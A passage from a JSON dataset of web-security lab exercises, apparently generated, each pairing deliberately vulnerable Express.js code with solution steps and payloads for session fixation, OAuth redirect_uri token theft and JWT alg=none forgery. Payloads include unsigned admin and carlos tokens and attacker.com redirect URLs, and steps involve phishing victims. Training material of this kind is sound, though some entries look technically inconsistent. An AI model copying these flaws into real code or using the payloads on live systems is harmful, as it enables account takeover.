    "srcCode": "const express = require('express'); const app = express(); const sessions = {}; const users = [{ username: 'carlos', password: 'carlospass' }]; app.get('/login', (req, res) => { const { username, password, sessionID } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[sessionID] = username; res.redirect(`/dashboard?sessionID=${sessionID}`); } else { res.send('Invalid credentials'); } }); app.get('/dashboard', (req, res) => { const user = sessions[req.query.sessionID]; if (user) { res.send(`Dashboard for ${user}`); } else { res.status(403).send('Access Denied'); } }); app.listen(3000);",
    "payloads": [
      "/login?username=carlos&password=carlospass&sessionID=abc123",
      "/dashboard?sessionID=abc123",
      "sessionID=predefined_session_id"
    ]
  },
  {
    "Lab scenario": "OAuth redirect_uri manipulation",
    "Lab Description": "This lab uses OAuth for login via a third-party provider. However, the application does not properly validate the redirect_uri parameter, allowing attackers to steal authorization codes. To solve: Intercept a login request and modify the redirect_uri to an attacker-controlled server, then extract the authorization code.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to intercept the login flow and capture the OAuth authorization request.",
      "Locate the redirect_uri parameter pointing to /oauth-callback.",
      "Change it to your exploit server (e.g., https://attacker.com/callback) and forward the request.",
      "Receive the OAuth code on your exploit server and replay it to the real app’s /oauth-callback endpoint.",
      "Obtain a session token and use it to access the /my-account endpoint as the victim."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); app.get('/login', (req, res) => { const redirect_uri = req.query.redirect_uri; const auth_url = `https://oauth.provider/auth?client_id=abc&redirect_uri=${redirect_uri}&response_type=code`; res.redirect(auth_url); }); app.get('/oauth-callback', async (req, res) => { const { code } = req.query; const token = await axios.post('https://oauth.provider/token', { code }); res.cookie('session', token.data.access_token); res.send('Logged in'); }); app.get('/my-account', (req, res) => { const session = req.cookies.session; if (session) res.send('User Account Data'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "https://oauth.provider/auth?client_id=abc&redirect_uri=https://attacker.com/callback&response_type=code",
      "POST /oauth-callback?code=stolen-code",
      "session=<access_token_from_stolen_code>"
    ]
  },
  {
    "Lab scenario": "JWT algorithm confusion in Authorization header",
    "Lab Description": "The application's JWT implementation accepts insecure algorithms during token validation. Specifically, it fails to enforce signature verification when the 'alg' field is modified to 'none'. The application trusts any Authorization: Bearer token that decodes to a valid user structure. To solve: craft a forged JWT token with 'none' algorithm and impersonate the user 'carlos' to access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request with a valid JWT after logging in.",
      "2. Decode the JWT using jwt.io or a Python script to observe its structure.",
      "3. Change the 'alg' header to 'none' and modify the payload to {\"username\": \"carlos\"}.",
      "4. Remove the JWT signature entirely and set the token as Authorization: Bearer <forged_token>.",
      "5. Send the modified request using Postman or Burp Repeater and observe access to Carlos's account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = ['carlos', 'admin']; app.get('/account', (req, res) => { const auth = req.headers['authorization']; if (!auth) return res.status(401).send('Unauthorized'); const token = auth.split(' ')[1]; const decoded = jwt.decode(token, { complete: true }); if (decoded && decoded.payload.username === 'carlos') { res.send('Account page of carlos'); } else { res.status(403).send('Access denied'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`JWT Confusion Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "{\"alg\": \"none\"} + {\"username\": \"carlos\"}",
      "Authorization: Bearer <unsigned_JWT_with_carlos>"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation in callback handler",
    "Lab Description": "The OAuth implementation improperly validates the redirect_uri parameter in the authentication flow. An attacker can manipulate the redirect to inject a malicious OAuth token or leak the access_token. To solve: manipulate the OAuth redirect to impersonate a victim user (carlos) and access their profile.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Intercept the OAuth login flow with Burp Suite or OWASP ZAP.",
      "2. Identify the redirect_uri parameter sent in the initial GET request to /oauth/authorize.",
      "3. Modify the redirect_uri to point to your attacker-controlled domain (e.g., https://attacker.com/callback).",
      "4. Capture the access_token redirected to your server and extract it from the query string.",
      "5. Replay an authenticated request using Postman with the stolen token in the Authorization header to impersonate Carlos."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/oauth/authorize', (req, res) => { const { redirect_uri, client_id } = req.query; if (!client_id || !redirect_uri) return res.status(400).send('Missing parameters'); const token = 'access_token_for_carlos'; res.redirect(`${redirect_uri}?access_token=${token}`); }); app.get('/profile', (req, res) => { const token = req.headers['authorization']; if (token === 'Bearer access_token_for_carlos') { res.send('Welcome Carlos'); } else { res.status(401).send('Unauthorized'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`OAuth Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "GET /oauth/authorize?client_id=abc&redirect_uri=https://attacker.com/callback",
      "Captured token: access_token_for_carlos",
      "Authorization: Bearer access_token_for_carlos"
    ]
  },
  {
    "Lab scenario": "Session fixation in Set-Cookie header",
    "Lab Description": "The application assigns session identifiers via a predictable scheme before authentication. It does not regenerate the session ID post-login, allowing attackers to fixate a session ID and later hijack the session once the victim logs in. To solve: pre-assign a session ID, get the victim to log in, and then use the same session ID to access their account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Postman or curl to access the application and receive a Set-Cookie with a session ID.",
      "2. Share the URL with the victim, ensuring the session ID is retained via URL or cookie.",
      "3. Wait for the victim to authenticate using the provided session.",
      "4. Reuse the session ID in a new request using Burp Repeater or curl.",
      "5. Confirm account access by requesting the /account endpoint and solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const sessions = {}; app.get('/login', (req, res) => { const sid = req.cookies.sid || `sess-${Date.now()}`; res.cookie('sid', sid); sessions[sid] = { authenticated: false }; res.send('<form method=\"POST\">Login</form>'); }); app.post('/login', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid]) { sessions[sid].authenticated = true; res.send('Logged in'); } else { res.send('Error'); } }); app.get('/account', (req, res) => { const sid = req.cookies.sid; if (sid && sessions[sid] && sessions[sid].authenticated) { res.send('Welcome to Carlos account'); } else { res.status(403).send('Forbidden'); } }); const PORT = 3000; app.listen(PORT, () => console.log(`Session Fixation Lab running on http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: sid=sess-1712345678901",
      "Share link with victim using same session ID",
      "Access account with: Cookie: sid=sess-1712345678901"
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure Set-Cookie handling in login endpoint",
    "Lab Description": "The login process fails to invalidate pre-authentication session cookies. The application sets the session ID before the user logs in, and that same session persists after successful authentication. To solve: Hijack Carlos's session by fixing a known session ID before authentication and access his account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1.Use Burp Suite to intercept the initial GET /login request and note the Set-Cookie: sessionId value.",
      "2.Send the unauthenticated sessionId to the victim via a malicious link, ensuring Carlos uses it.",
      "3.Once Carlos logs in using the fixed session ID, use the same session ID cookie to authenticate as him.",
      "4.Replay the GET /my-account request with the fixed session ID cookie.",
      "5.Confirm successful account access by verifying Carlos's account data in the response."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'carlospass' }]; const sessions = {}; app.get('/login', (req, res) => { let sid = Math.random().toString(36).substring(2); res.cookie('sessionId', sid); res.send('Login page'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sessionId] = username; res.send('Logged in'); } else { res.status(403).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const sid = req.cookies.sessionId; if (sessions[sid]) res.send(`Account page for ${sessions[sid]}`); else res.status(403).send('Unauthorized'); }); app.listen(4000);",
    "payloads": [
      "Use predefined sessionId in victim's cookie before login",
      "Replay sessionId in attacker's browser after victim logs in"
    ]
  },
  {
    "Lab scenario": "JWT token tampering with symmetric algorithm substitution",
    "Lab Description": "This application uses JWTs for session management but supports algorithm substitution from RS256 to HS256 using a public key as the secret. To solve: Forge a valid JWT token for Carlos and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use Burp Suite or Postman to capture the JWT token issued after authentication.",
      "2.Decode the token header and replace \"alg\": \"RS256\" with \"alg\": \"HS256\".",
      "3.Use the server's public key as the HMAC secret key to sign a new JWT with 'username': 'carlos'.",
      "4.Replace the original JWT with your forged token in Authorization: Bearer header.",
      "5.Send a request to GET /my-account and verify access to Carlos's account page."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const fs = require('fs'); const app = express(); const privateKey = fs.readFileSync('./private.pem'); const publicKey = fs.readFileSync('./public.pem'); app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, privateKey, { algorithm: 'RS256' }); res.json({ token }); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; try { const decoded = jwt.verify(token, publicKey); res.send(`Account data for ${decoded.username}`); } catch { res.status(403).send('Invalid token'); } }); app.listen(4000);",
    "payloads": [
      "Header: {\"alg\":\"HS256\",\"typ\":\"JWT\"}",
      "Payload: {\"username\":\"carlos\"}",
      "Sign with HMAC using server's public key as secret"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with open redirect leading to token theft",
    "Lab Description": "The OAuth redirect_uri is not properly validated, enabling redirection to arbitrary domains. The app leaks the OAuth access token in the URL fragment. To solve: Steal Carlos's access token via a crafted phishing link and access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1.Use OWASP ZAP or Burp to observe the OAuth flow and note the redirect_uri parameter.",
      "2.Craft a phishing URL with redirect_uri set to your controlled domain and send it to Carlos.",
      "3.Extract the access_token from the URL fragment once Carlos authenticates.",
      "4.Use the stolen token in an Authorization: Bearer header.",
      "5.Send a GET request to /my-account and verify access to Carlos's data."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); app.get('/auth', (req, res) => { const { redirect_uri } = req.query; const token = 'token-for-carlos'; res.redirect(`${redirect_uri}#access_token=${token}`); }); app.get('/my-account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-for-carlos') res.send('Account data for carlos'); else res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "https://vulnerable-app.com/auth?redirect_uri=https://attacker.com/callback",
      "Use stolen token: Authorization: Bearer token-for-carlos"
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in session token",
    "Lab Description": "This lab's JWT-based session handling is vulnerable to algorithm confusion. The server does not enforce strict verification of the signing algorithm. The application blindly trusts the `alg` field in the token. To solve: Forge a JWT token with algorithm `none` and escalate your privileges to admin to access the admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Burp Suite to intercept the JWT after logging in with a regular user account.",
      "Send the token to Decoder and change the algorithm field in the JWT header from 'HS256' to 'none'.",
      "Remove the signature portion of the token completely.",
      "Modify the payload to include {\"username\":\"admin\"}.",
      "Forward the modified token in an Authorization header and access /admin."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.json()); const SECRET = 'supersecret'; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, SECRET, { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const authHeader = req.headers.authorization; if (!authHeader) return res.status(401).send('Unauthorized'); const token = authHeader.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); if (payload && payload.payload.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4000; app.listen(PORT, () => console.log(`JWT Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{\"username\":\"admin\"}."
    ]
  },
  {
    "Lab scenario": "Session fixation via insecure session regeneration",
    "Lab Description": "This lab's session handling mechanism is vulnerable to session fixation. The server does not regenerate session IDs after successful login, allowing an attacker to set the session ID beforehand. To solve: Fix a known session ID, trick the victim into logging in, and access their session to view the My Account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Postman to initiate a session as an attacker and capture the fixed session ID.",
      "Send a phishing link to the victim that includes the session ID as a cookie.",
      "Wait for the victim to log in using the provided session.",
      "Use the same session ID to access their account.",
      "Navigate to /my-account to verify access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const session = require('express-session'); const bodyParser = require('body-parser'); const app = express(); app.use(bodyParser.urlencoded({ extended: false })); app.use(session({ secret: 'keyboard cat', resave: false, saveUninitialized: true })); const users = { carlos: 'pass123' }; app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { req.session.username = username; res.send('Logged in'); } else { res.send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { if (req.session.username === 'carlos') { res.send('Carlos account accessed'); } else { res.status(403).send('Forbidden'); } }); const PORT = 4001; app.listen(PORT, () => console.log(`Session Fixation Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "Cookie: connect.sid=sess:abcd1234",
      "Phishing link with pre-set cookie: document.cookie = 'connect.sid=sess:abcd1234';"
    ]
  },
  {
    "Lab scenario": "OAuth redirect URI manipulation",
    "Lab Description": "This lab simulates a misconfigured OAuth flow that allows redirect URI manipulation. The authorization server does not validate the redirect URI against a whitelist. To solve: Manipulate the redirect URI to intercept an OAuth authorization code and reuse it to log in as Carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Using Burp Suite, initiate the OAuth login flow and intercept the authorization request.",
      "Modify the `redirect_uri` parameter to a malicious domain under your control.",
      "Host a listener to capture the authorization code sent by the OAuth server.",
      "Exchange the captured code manually for an access token via Postman.",
      "Use the access token to authenticate as Carlos and access /my-account."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const axios = require('axios'); const app = express(); const redirectMap = {}; app.get('/auth', (req, res) => { const { code, redirect_uri } = req.query; if (!code) { const authURL = `https://oauth.example.com/auth?response_type=code&client_id=client123&redirect_uri=${redirect_uri}`; res.redirect(authURL); } else { redirectMap[code] = redirect_uri; res.send('Code received'); } }); app.get('/callback', async (req, res) => { const { code } = req.query; const redirect_uri = redirectMap[code]; const tokenResponse = await axios.post('https://oauth.example.com/token', { code, redirect_uri }); const accessToken = tokenResponse.data.access_token; if (accessToken === 'carlos-token') { res.send('Welcome Carlos'); } else { res.status(403).send('Invalid token'); } }); const PORT = 4002; app.listen(PORT, () => console.log(`OAuth Redirect Lab running at http://localhost:${PORT}`));",
    "payloads": [
      "https://oauth.example.com/auth?client_id=client123&redirect_uri=https://attacker.com/callback",
      "Authorization: Bearer carlos-token"
    ]
  },
  {
    "Lab scenario": "Session Fixation via Predictable Session ID",
    "Lab Description": "This lab's session management is vulnerable to session fixation. The server accepts session IDs from unauthenticated users and does not regenerate them upon login. The application stores the session ID in a cookie named sid. To solve: hijack Carlos's session and access his account page using a fixed session ID set before login.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Capture pre-login traffic in Burp Suite and note the sid cookie structure",
      "Send a crafted request with a preset sid and log in as Carlos",
      "Craft a link with the same sid value and send it to Carlos",
      "After Carlos logs in, reuse the fixed sid to hijack the session",
      "Verify access to /my-account to solve the lab"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const app = express(); app.use(cookieParser()); const users = [{ username: 'carlos', password: 'supersecret' }]; const sessions = {}; app.get('/login', (req, res) => { const { username, password } = req.query; const user = users.find(u => u.username === username && u.password === password); if (user) { const sid = req.cookies.sid; sessions[sid] = username; res.send('Logged in'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const username = sessions[req.cookies.sid]; if (username === 'carlos') res.send('Welcome to your account, Carlos'); else res.status(403).send('Unauthorized'); }); app.listen(3000);",
    "payloads": [
      "sid=fix123; login as carlos",
      "GET /my-account with Cookie: sid=fix123",
      "Phish Carlos with URL using sid=fix123"
    ]
  },
  {
    "Lab scenario": "JWT tampering due to missing signature validation",
    "Lab Description": "This lab is vulnerable to JWT tampering. The backend decodes JWTs without validating their signatures. JWTs are used for user authentication and passed via Authorization headers. To solve: forge a valid JWT identifying as Carlos and access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Capture JWT from your login session using Burp Suite",
      "Decode the JWT using jwt.io and inspect the payload",
      "Modify payload to {\"user\":\"carlos\"} and change alg to none",
      "Remove the signature part and replay token in Authorization header",
      "Send GET /profile and verify access to Carlos's account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(express.json()); const users = [{ username: 'carlos', password: 'hunter2' }]; app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (!user) return res.status(401).send('Login failed'); const token = jwt.sign({ user: username }, 'secret', { algorithm: 'HS256' }); res.send({ token }); }); app.get('/profile', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const decoded = jwt.decode(token); if (decoded.user === 'carlos') return res.send('Carlos profile data'); res.status(403).send('Access denied'); }); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0.",
      "Authorization: Bearer [forged_token]",
      "{\"alg\":\"none\",\"user\":\"carlos\"}"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration: open redirect token theft",
    "Lab Description": "The lab contains an OAuth implementation with an open redirect in the redirect_uri parameter. The application does not validate redirect URIs strictly, enabling attackers to steal OAuth authorization codes. To solve: craft a malicious redirect_uri, capture Carlos's OAuth code, and exchange it for a token to access his account.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Send OAuth request with redirect_uri pointing to attacker-controlled server",
      "Trick Carlos into visiting the crafted OAuth URL",
      "Capture authorization code from your server logs",
      "Exchange code for access token via legitimate OAuth token endpoint",
      "Use the token to access /api/account"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const axios = require('axios'); app.get('/auth', (req, res) => { const redirectUri = req.query.redirect_uri; res.redirect(`${redirectUri}?code=authcode123`); }); app.get('/token', async (req, res) => { const { code } = req.query; if (code === 'authcode123') res.send({ access_token: 'token-carlos' }); else res.status(400).send('Invalid code'); }); app.get('/api/account', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'token-carlos') res.send('Carlos account data'); else res.status(403).send('Forbidden'); }); app.listen(5000);",
    "payloads": [
      "https://victim.com/auth?redirect_uri=https://attacker.com/collect",
      "Captured code=authcode123",
      "GET /token?code=authcode123",
      "Authorization: Bearer token-carlos"
    ]
  },
  {
    "Lab scenario": "GraphQL endpoint exposing JWT manipulation vulnerability",
    "Lab Description": "A GraphQL API implements authentication using a stateless JWT stored in the Authorization header. The server does not validate the token signature, allowing attackers to craft arbitrary JWTs to impersonate users. The application accepts unsigned tokens with alg=none and exposes a GraphQL endpoint. To solve: Forge a JWT as carlos and retrieve his user profile.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "Use Postman to query the /graphql endpoint with a valid JWT to understand token structure",
      "Validate the server ignores signature by crafting a token with alg=none using jwt.io",
      "Edit JWT payload with { \"username\": \"carlos\" } and remove the signature segment",
      "Resend the modified token in Authorization: Bearer header to the GraphQL endpoint",
      "Query { userProfile { email username } } and confirm the username returned is carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const { graphqlHTTP } = require('express-graphql'); const { buildSchema } = require('graphql'); const app = express(); const schema = buildSchema(`type Query { userProfile: User } type User { username: String, email: String }`); const users = { 'carlos': { username: 'carlos', email: 'carlos@example.com' } }; app.use('/graphql', (req, res, next) => { const auth = req.headers['authorization']; if (auth) { const token = auth.split(' ')[1]; try { req.user = jwt.decode(token); } catch (e) { return res.status(401).send('Invalid Token'); } } next(); }, graphqlHTTP(req => ({ schema: schema, rootValue: { userProfile: () => users[req.user?.username] }, graphiql: false }))); app.listen(4000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImNhcmxvcyJ9.",
      "eyJhbGciOiJub25lIn0.eyJ1c2VyIjoiY2FybG9zIn0."
    ]
  },
  {
    "Lab scenario": "Session fixation via predictable session ID in login workflow",
    "Lab Description": "This application assigns session IDs before login using a predictable UUIDv4 generator. After login, the same session ID remains active. The attacker can set their session ID and then trick the victim into using it. When the victim logs in, the attacker gains access to their session. To solve: Hijack Carlos's session and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use Burp Suite to capture a GET /login request and notice the Set-Cookie: session= field uses predictable UUIDs",
      "Send a request with a custom session ID like session=123e4567-e89b-12d3-a456-426614174000 before login",
      "Send this crafted link with the same session ID to carlos (simulate using Burp Collaborator or inject via referrer)",
      "Wait for Carlos to log in through the crafted link which ties his account to attacker session",
      "Reuse the same session ID to access /my-account as carlos"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const uuid = require('uuid'); const cookieParser = require('cookie-parser'); const bodyParser = require('body-parser'); const app = express(); app.use(cookieParser()); app.use(bodyParser.urlencoded({ extended: true })); const sessions = {}; const users = { 'carlos': 'password123' }; app.get('/login', (req, res) => { const sid = req.cookies.session || uuid.v4(); res.cookie('session', sid); res.send('<form method=\"POST\">Username: <input name=\"username\"><br>Password: <input name=\"password\"><input type=\"submit\"></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; if (users[username] === password) { sessions[req.cookies.session] = username; res.redirect('/my-account'); } else { res.send('Invalid login'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.session]; if (user) res.send(`Welcome ${user}`); else res.send('Not authenticated'); }); app.listen(4000);",
    "payloads": [
      "Cookie: session=123e4567-e89b-12d3-a456-426614174000",
      "Cookie: session=deadbeef-dead-beef-dead-beefdeadbeef"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration in third-party login integration",
    "Lab Description": "The application integrates with a third-party OAuth provider but does not validate the returned access token properly. Attackers can reuse tokens issued to different clients. The misconfiguration stems from missing audience (aud) validation. To solve: Use a token issued for another app to log in as carlos.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "Use OWASP ZAP or Postman to initiate OAuth login for your own account and capture the access token returned",
      "Notice the JWT contains claims for sub, aud, and email, but the app only checks sub for identity",
      "Obtain a token from the same OAuth provider issued to a different client_id but for sub=carlos",
      "Replace your token with the forged one in the Authorization header and send a request to /auth/callback",
      "Verify access by accessing the protected /my-account endpoint and observing Carlos’s profile"
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); const users = { 'carlos': { email: 'carlos@example.com' } }; app.get('/auth/callback', (req, res) => { const token = req.query.token; try { const decoded = jwt.decode(token); req.user = decoded.sub; } catch (err) { return res.status(400).send('Invalid token'); } res.redirect('/my-account'); }); app.get('/my-account', (req, res) => { if (req.user && users[req.user]) { res.send(`User: ${req.user}, Email: ${users[req.user].email}`); } else { res.status(403).send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJmYWtlLW90aGVyLWFwcCJ9.signature",
      "Bearer eyJhbGciOiJub25lIn0.eyJzdWIiOiJjYXJsb3MiLCJhdWQiOiJtb2NrLWFwcCJ9."
    ]
  },
  {
    "Lab scenario": "JWT tampering via algorithm confusion in authorization header",
    "Lab Description": "This lab's authorization system uses JWT tokens for user identity and access control. The server validates tokens based on the algorithm specified in the token header without enforcing expected signing algorithms. The application naively accepts tokens signed with the 'none' algorithm. To solve: Craft a JWT token that impersonates the 'admin' user and access the /admin panel.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Intercept the login request using Burp Suite and extract the JWT from the Authorization header.",
      "2. Decode the token at jwt.io or using a script to examine the header and payload. Confirm that the server allows algorithm substitution.",
      "3. Modify the JWT header to set \"alg\": \"none\" and set the payload to {\"username\":\"admin\"}.",
      "4. Remove the signature portion entirely and resend the modified token in the Authorization header using Postman or Burp Repeater.",
      "5. Send a GET request to /admin with the forged JWT and verify access is granted."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const jwt = require('jsonwebtoken'); const app = express(); app.use(require('body-parser').json()); const users = [{ username: 'admin' }, { username: 'wiener' }]; app.post('/login', (req, res) => { const { username } = req.body; const token = jwt.sign({ username }, 'supersecret', { algorithm: 'HS256' }); res.json({ token }); }); app.get('/admin', (req, res) => { const auth = req.headers.authorization; const token = auth && auth.split(' ')[1]; const payload = jwt.decode(token, { complete: true }); const verified = jwt.verify(token, 'supersecret', { algorithms: [payload.header.alg] }); if (verified.username === 'admin') { res.send('Welcome Admin!'); } else { res.status(403).send('Access denied'); } }); app.listen(3000);",
    "payloads": [
      "eyJhbGciOiJub25lIn0.eyJ1c2VybmFtZSI6ImFkbWluIn0.",
      "{\"alg\":\"none\"}.{ \"username\":\"admin\" }.",
      "Authorization: Bearer <unsigned-admin-token>"
    ]
  },
  {
    "Lab scenario": "Session fixation through predictable session token reuse",
    "Lab Description": "The lab's login mechanism assigns session tokens before authentication, but does not regenerate them afterward. The application uses cookies to maintain session state. An attacker can set a session ID before victim login, and it will be reused after successful authentication. To solve: Fixate Carlos's session ID and access his account page.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp Suite to capture the GET /login request and note the Set-Cookie header issuing the session ID.",
      "2. Share this crafted session ID with the victim (Carlos) using social engineering or embedding it in a phishing page.",
      "3. After Carlos logs in, reuse the same session ID to impersonate him by replaying it in a request to /my-account.",
      "4. Use the session cookie in Burp Repeater to make an authenticated request to /my-account.",
      "5. Confirm that the session token grants access to Carlos's profile, solving the lab."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const cookieParser = require('cookie-parser'); const uuid = require('uuid'); const app = express(); app.use(cookieParser()); app.use(express.urlencoded({ extended: true })); const sessions = {}; const users = [{ username: 'carlos', password: 'secret123' }]; app.get('/login', (req, res) => { const sid = req.cookies.sid || uuid.v4(); res.cookie('sid', sid); res.send('<form method=\"POST\" action=\"/login\"><input name=\"username\"/><input name=\"password\"/><input type=\"submit\"/></form>'); }); app.post('/login', (req, res) => { const { username, password } = req.body; const user = users.find(u => u.username === username && u.password === password); if (user) { sessions[req.cookies.sid] = username; res.redirect('/my-account'); } else { res.status(401).send('Invalid credentials'); } }); app.get('/my-account', (req, res) => { const user = sessions[req.cookies.sid]; if (user === 'carlos') { res.send('Sensitive info of Carlos'); } else { res.send('Unauthorized'); } }); app.listen(4000);",
    "payloads": [
      "GET /login with preset cookie: sid=attacker123",
      "POST /login with credentials for Carlos using sid=attacker123",
      "GET /my-account with same sid=attacker123"
    ]
  },
  {
    "Lab scenario": "OAuth misconfiguration with token leakage via redirect_uri manipulation",
    "Lab Description": "This lab's third-party OAuth implementation fails to properly validate redirect_uri parameters. The attacker can inject a malicious endpoint to steal access tokens via a crafted URL. The application uses OAuth for logging in users. To solve: Leak Carlos's token and use it to access his profile endpoint.",
    "Difficulty Level": "Hard",
    "Solution Steps": [
      "1. Use Burp to observe the OAuth login flow. Identify the authorization endpoint and check how redirect_uri is handled.",
      "2. Inject your controlled endpoint (e.g., attacker.com/callback) into the redirect_uri parameter to intercept the token.",
      "3. Send the crafted authorization URL to Carlos (phishing/social engineering). Wait for him to click and authorize.",
      "4. Capture the token in your server logs (access_token in query string or fragment).",
      "5. Replay an authenticated request with the stolen token to /api/profile and confirm access."
    ],
    "Vulnerability name": "Authentication",
    "srcCode": "const express = require('express'); const app = express(); const querystring = require('querystring'); const tokens = { 'carlos': 'abc123token' }; app.get('/oauth/authorize', (req, res) => { const { client_id, redirect_uri, response_type } = req.query; if (client_id === 'trusted-client' && response_type === 'token') { const token = tokens['carlos']; const redir = `${redirect_uri}#access_token=${token}`; res.redirect(redir); } else { res.status(400).send('Invalid request'); } }); app.get('/api/profile', (req, res) => { const token = req.headers.authorization?.split(' ')[1]; if (token === 'abc123token') { res.send('Carlos profile data'); } else { res.status(401).send('Unauthorized'); } }); app.listen(8080);",
    "payloads": [
      "https://target.com/oauth/authorize?client_id=trusted-client&redirect_uri=https://attacker.com/callback&response_type=token",
      "GET /api/profile with header Authorization: Bearer abc123token",
      "#access_token=abc123token intercepted from attacker.com logs"
    ]
  },
  {
    "Lab scenario": "JWT tampering via none algorithm in authorization header",
    "Lab Description": "The application uses JSON Web Tokens (JWT) for session management, but fails to validate the signature algorithm securely. It accepts tokens with the 'alg' set to 'none' without verifying the signature. The application blindly trusts the decoded payload. To solve: Craft a tampered JWT token impersonating the user 'carlos' and access their account page.",
    "Difficulty Level": "Medium",
    "Solution Steps": [
      "1. Use Burp Suite to intercept a request to /my-account while logged in with your own user.",
      "2. Extract the JWT token from the Authorization header and decode it using jwt.io or Burp Decoder.",
      "3. Modify the payload to { \"username\": \"carlos\" } and set the header to { \"alg\": \"none\" }, then remove the signature.",
      "4. Replace the Authorization header value with your modified unsigned token.",
      "5. Forward the modified request to /my-account and verify if Carlos's account data is accessible."
    ],
    "Vulnerability name": "Authentication",
